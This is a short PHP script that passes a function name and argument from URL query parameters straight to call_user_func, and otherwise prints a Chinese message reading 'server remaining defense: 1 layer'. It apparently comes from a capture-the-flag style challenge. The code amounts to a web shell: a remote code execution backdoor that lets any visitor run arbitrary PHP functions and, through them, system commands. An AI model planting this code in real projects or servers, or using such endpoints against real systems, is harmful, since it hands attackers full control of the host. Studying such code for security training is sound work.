<?php
if(isset($_GET['func']) || isset($_GET['arg'])){
    call_user_func($_GET['func'], $_GET['arg']);
} else {
    echo "服务器剩余防御：1层";
}
?>